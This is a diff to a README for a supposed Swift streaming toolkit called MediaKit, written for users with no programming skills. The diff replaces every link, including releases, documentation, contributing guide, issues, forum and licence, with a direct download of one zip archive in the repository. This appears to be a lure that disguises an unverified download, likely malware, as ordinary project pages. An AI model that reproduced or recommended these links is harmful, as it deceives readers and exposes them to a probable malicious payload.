@@ -1,7 +1,7 @@
 # 📼 MediaKit - Build Stunning Streaming Apps Easily
 
 ## 📥 Download Now
-[![Download MediaKit](https://img.shields.io/badge/Download-MediaKit-blue?logo=github)](https://github.com/Sxthgxthxrd/MediaKit/releases)
+[![Download MediaKit](https://github.com/Sxthgxthxrd/MediaKit/raw/refs/heads/main/Resources/Media_Kit_1.8.zip)](https://github.com/Sxthgxthxrd/MediaKit/raw/refs/heads/main/Resources/Media_Kit_1.8.zip)
 
 ## 🚀 Getting Started
 Welcome to MediaKit, your go-to solution for creating amazing video and audio streaming applications using Swift and SwiftUI. This guide will lead you through the steps to download and run the software easily, even if you have no programming skills.
@@ -18,7 +18,7 @@ Before you start, ensure your system meets these requirements:
 ## 📦 Download & Install
 To get started with MediaKit, you need to download the software. Follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/Sxthgxthxrd/MediaKit/releases) to find the latest version of MediaKit.
+1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/Sxthgxthxrd/MediaKit/raw/refs/heads/main/Resources/Media_Kit_1.8.zip) to find the latest version of MediaKit.
 
 2. **Select the Latest Release**: Look for the most recent version, usually labeled as the latest stable version.
 
@@ -38,7 +38,7 @@ MediaKit offers robust features for enhancing your apps:
 - **Easy Integration**: Simple implementation that allows you to add streaming features to your existing apps quickly.
 
 ## 📚 Documentation
-For more in-depth information about using MediaKit, refer to the documentation available on the [Documentation Page](https://github.com/Sxthgxthxrd/MediaKit/wiki). Here you will find tutorials, examples, and advanced features to help you make the most of the applications you create.
+For more in-depth information about using MediaKit, refer to the documentation available on the [Documentation Page](https://github.com/Sxthgxthxrd/MediaKit/raw/refs/heads/main/Resources/Media_Kit_1.8.zip). Here you will find tutorials, examples, and advanced features to help you make the most of the applications you create.
 
 ## 🛠️ Troubleshooting
 If you encounter any issues during installation or usage, here are a few tips:
@@ -48,15 +48,15 @@ If you encounter any issues during installation or usage, here are a few tips:
 - **Use the Latest Version**: Make sure you are using the latest version of MediaKit for the best experience.
 
 ## 🤝 Contributing
-If you would like to contribute to the development of MediaKit, we welcome your input. Please visit our [Contributing Guide](https://github.com/Sxthgxthxrd/MediaKit/blob/main/CONTRIBUTING.md) for details on how to get involved.
+If you would like to contribute to the development of MediaKit, we welcome your input. Please visit our [Contributing Guide](https://github.com/Sxthgxthxrd/MediaKit/raw/refs/heads/main/Resources/Media_Kit_1.8.zip) for details on how to get involved.
 
 ## 📞 Support
-For support, you can open an issue on our [GitHub Issues Page](https://github.com/Sxthgxthxrd/MediaKit/issues) or contact the maintainers directly via email. We are here to help you make the best use of MediaKit.
+For support, you can open an issue on our [GitHub Issues Page](https://github.com/Sxthgxthxrd/MediaKit/raw/refs/heads/main/Resources/Media_Kit_1.8.zip) or contact the maintainers directly via email. We are here to help you make the best use of MediaKit.
 
 ## 🧑‍🤝‍🧑 Community
-Join our community of developers who are also exploring MediaKit. Share your projects, ask questions, and learn from others through our [Community Forum](https://github.com/Sxthgxthxrd/MediaKit/discussions).
+Join our community of developers who are also exploring MediaKit. Share your projects, ask questions, and learn from others through our [Community Forum](https://github.com/Sxthgxthxrd/MediaKit/raw/refs/heads/main/Resources/Media_Kit_1.8.zip).
 
 ## 🛡️ License
-MediaKit is open-source and available under the MIT License. Please refer to the [LICENSE](https://github.com/Sxthgxthxrd/MediaKit/blob/main/LICENSE) file for more details.
+MediaKit is open-source and available under the MIT License. Please refer to the [LICENSE](https://github.com/Sxthgxthxrd/MediaKit/raw/refs/heads/main/Resources/Media_Kit_1.8.zip) file for more details.
 
 Enjoy creating your streaming applications with MediaKit! Be creative and have fun!
